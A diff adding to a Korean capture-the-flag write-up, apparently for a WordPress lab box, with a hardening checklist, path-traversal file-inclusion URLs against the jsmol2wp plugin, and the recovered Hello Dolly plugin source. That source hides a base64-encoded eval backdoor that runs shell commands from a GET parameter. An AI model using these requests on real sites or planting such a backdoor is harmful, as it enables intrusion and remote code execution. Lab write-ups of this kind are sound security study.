@@ -326,4 +326,149 @@ require_once ABSPATH . 'wp-settings.php';
 
 # stored XSS 바로 확인 가능
 
+![](https://velog.velcdn.com/images/agnusdei1207/post/b6ccdc9b-2df6-4ca3-a428-a4277f4f3dc4/image.png)
 ![](https://velog.velcdn.com/images/agnusdei1207/post/477f28cf-9889-4aef-8be6-8cedd95d97b1/image.png)
+![](https://velog.velcdn.com/images/agnusdei1207/post/b2331716-58bb-4853-864a-5c8847a2f124/image.png)
+
+1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
+
+2- Set Up HTTPS: Configure an SSL certificate to enable HTTPS and encrypt data transmission.
+
+3- Update Software: Regularly update your CMS, plugins, and themes to patch vulnerabilities.
+
+4- Strong Passwords: Enforce strong passwords for users and administrators.
+
+5- Input Validation: Validate and sanitize user inputs to prevent attacks like SQL injection and XSS.
+
+6- [IMPORTANT] Firewall Installation: Install a web application firewall (WAF) to filter incoming traffic.
+
+7- Backup Strategy: Set up regular backups of your website and databases.
+
+8- [IMPORTANT] User Permissions: Assign minimum necessary permissions to users based on roles.
+
+9- Content Security Policy: Implement a CSP to control resource loading and prevent malicious scripts.
+
+10- Secure File Uploads: Validate file types, use secure upload directories, and restrict execution permissions.
+
+11- Regular Security Audits: Conduct routine security assessments, vulnerability scans, and penetration tests.
+
+# https://github.com/WordPress/hello-dolly -> hello.php 플러그인 확인
+
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+
+# LFI 파일을 기준으로 플러그인 파일 유추 -> 무작위 시도
+
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../hello.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../hello.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../hello.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../hello.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../hello.php
+
+# http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
+
+```
+<?php
+/**
+ * @package Hello_Dolly
+ * @version 1.7.2
+ */
+/*
+Plugin Name: Hello Dolly
+Plugin URI: http://wordpress.org/plugins/hello-dolly/
+Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
+Author: Matt Mullenweg
+Version: 1.7.2
+Author URI: http://ma.tt/
+*/
+
+function hello_dolly_get_lyric() {
+	/** These are the lyrics to Hello Dolly */
+	$lyrics = "Hello, Dolly
+Well, hello, Dolly
+It's so nice to have you back where you belong
+You're lookin' swell, Dolly
+I can tell, Dolly
+You're still glowin', you're still crowin'
+You're still goin' strong
+I feel the room swayin'
+While the band's playin'
+One of our old favorite songs from way back when
+So, take her wrap, fellas
+Dolly, never go away again
+Hello, Dolly
+Well, hello, Dolly
+It's so nice to have you back where you belong
+You're lookin' swell, Dolly
+I can tell, Dolly
+You're still glowin', you're still crowin'
+You're still goin' strong
+I feel the room swayin'
+While the band's playin'
+One of our old favorite songs from way back when
+So, golly, gee, fellas
+Have a little faith in me, fellas
+Dolly, never go away
+Promise, you'll never go away
+Dolly'll never go away again";
+
+	// Here we split it into lines.
+	$lyrics = explode( "\n", $lyrics );
+
+	// And then randomly choose a line.
+	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
+}
+
+// This just echoes the chosen line, we'll position it later.
+function hello_dolly() {
+	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
+
+	$chosen = hello_dolly_get_lyric();
+	$lang   = '';
+	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
+		$lang = ' lang="en"';
+	}
+
+	printf(
+		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
+		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
+		$lang,
+		$chosen
+	);
+}
+
+// Now we set that function up to execute when the admin_notices action is called.
+add_action( 'admin_notices', 'hello_dolly' );
+
+// We need some CSS to position the paragraph.
+function dolly_css() {
+	echo "
+	<style type='text/css'>
+	#dolly {
+		float: right;
+		padding: 5px 10px;
+		margin: 0;
+		font-size: 12px;
+		line-height: 1.6666;
+	}
+	.rtl #dolly {
+		float: left;
+	}
+	.block-editor-page #dolly {
+		display: none;
+	}
+	@media screen and (max-width: 782px) {
+		#dolly,
+		.rtl #dolly {
+			float: none;
+			padding-left: 0;
+			padding-right: 0;
+		}
+	}
+	</style>
+	";
+}
+
+add_action( 'admin_head', 'dolly_css' );
+
+```
